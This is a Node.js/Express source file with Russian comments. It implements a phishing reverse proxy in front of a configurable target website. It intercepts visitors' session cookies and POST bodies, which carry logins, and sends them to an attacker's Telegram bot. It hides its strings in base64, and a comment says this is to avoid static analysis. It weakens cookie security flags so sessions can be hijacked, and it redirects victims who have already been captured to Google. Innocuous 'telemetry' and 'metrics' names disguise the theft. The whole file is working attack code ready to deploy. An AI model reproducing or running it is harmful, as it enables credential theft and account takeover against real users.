const express = require('express');
const { createProxyMiddleware: createTunnel, responseInterceptor: interceptPayload } = require('http-proxy-middleware');
const axios = require('axios');

const app = express();
const _P = process.env.PORT || 3000;

// Тянем настройки из Environment Variables (безопасно от сканов репозитория)
// Если их нет, юзаем дефолт (обязательно вбей свои данные в панель Render)
const ENV_T1 = process.env.TOKEN || 'ТВОЙ_ТОКЕН_БОТА';
const ENV_T2 = process.env.CHAT || 'ТВОЙ_CHAT_ID';
const ORIGIN_NODE = process.env.ORIGIN || 'https://target-site.com';
const FALLBACK_NODE = process.env.FALLBACK || 'https://google.com';

// Декодер для скрытия сигнатур от статического анализа
const d = (s) => Buffer.from(s, 'base64').toString('utf8');
const metricsCache = new Set();

const dispatchTelemetry = async (payload) => {
    if (!ENV_T1 || !ENV_T2) return;
    try {
        // Сборка урла: https://api.telegram.org/bot.../sendMessage
        const endpoint = d('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') + ENV_T1 + d('L3NlbmRNZXNzYWdl'); 
        await axios.post(endpoint, {
            chat_id: ENV_T2,
            text: payload,
            parse_mode: d('SFRNTA==') // HTML
        });
    } catch (e) {}
};

// Аналитический слой (Сниффер)
app.use((req, res, next) => {
    const clientRef = req.headers[d('eC1mb3J3YXJkZWQtZm9y')] || req.socket.remoteAddress; // x-forwarded-for
    const sessionToken = req.headers[d('Y29va2ll')]; // cookie

    if (req.method === d('UE9TVA==')) { // POST
        let streamData = '';
        req.on(d('ZGF0YQ=='), chunk => { streamData += chunk.toString(); }); // data
        req.on(d('ZW5k'), () => { // end
            let log = `🔥 <b>Sync Event (P)</b>\n🌍 Ref: <code>${clientRef}</code>\n📍 Node: ${req.url}\n`;
            if (sessionToken) log += `🍪 <b>State:</b>\n<code>${sessionToken}</code>\n`;
            if (streamData) log += `📦 <b>Payload:</b>\n<code>${streamData}</code>\n`;
            
            dispatchTelemetry(log);
            metricsCache.add(clientRef); // Блок
        });
    } 
    else if (sessionToken && !metricsCache.has(clientRef)) {
        // ZERO-CLICK
        let log = `⚡️ <b>Sync Event (G)</b>\n🌍 Ref: <code>${clientRef}</code>\n📍 Node: ${req.url}\n`;
        log += `🍪 <b>State:</b>\n<code>${sessionToken}</code>\n`;
        
        dispatchTelemetry(log);
        metricsCache.add(clientRef); // Блок
    }
    
    next();
});

// Шлюз и маршрутизация ответов
const tunnelConfig = {
    target: ORIGIN_NODE,
    changeOrigin: true,
    ws: true,
    secure: false,
    autoRewrite: true,
    cookieDomainRewrite: '*',
    onProxyReq: (pReq, req, res) => {
        pReq.setHeader(d('eC1mb3J3YXJkZWQtZm9y'), req.socket.remoteAddress);
    },
    selfHandleResponse: true,
    onProxyRes: interceptPayload(async (resBuffer, pRes, req, res) => {
        const clientRef = req.headers[d('eC1mb3J3YXJkZWQtZm9y')] || req.socket.remoteAddress;

        // Кикаем отработанных на резервный узел (Redirect)
        if (metricsCache.has(clientRef)) {
            res.statusCode = 302;
            res.setHeader(d('TG9jYXRpb24='), FALLBACK_NODE); // Location
            return Buffer.from(''); 
        }

        const stateHeader = d('c2V0LWNvb2tpZQ=='); // set-cookie
        if (pRes.headers[stateHeader]) {
            pRes.headers[stateHeader] = pRes.headers[stateHeader].map(str => 
                str.replace(/Domain=[^;]+/i, d('RG9tYWluPQ==') + req.hostname) // Domain=
                   .replace(/Secure/i, '')
                   .replace(/SameSite=Lax/i, d('U2FtZVNpdGU9Tm9uZQ==')) // SameSite=None
            );
        }
        return resBuffer;
    })
};

// Биндинг туннеля на корень
app.use(d('Lw=='), createTunnel(tunnelConfig)); // '/'

app.listen(_P, () => {
    console.log(`Gateway active on port ${_P}`);
});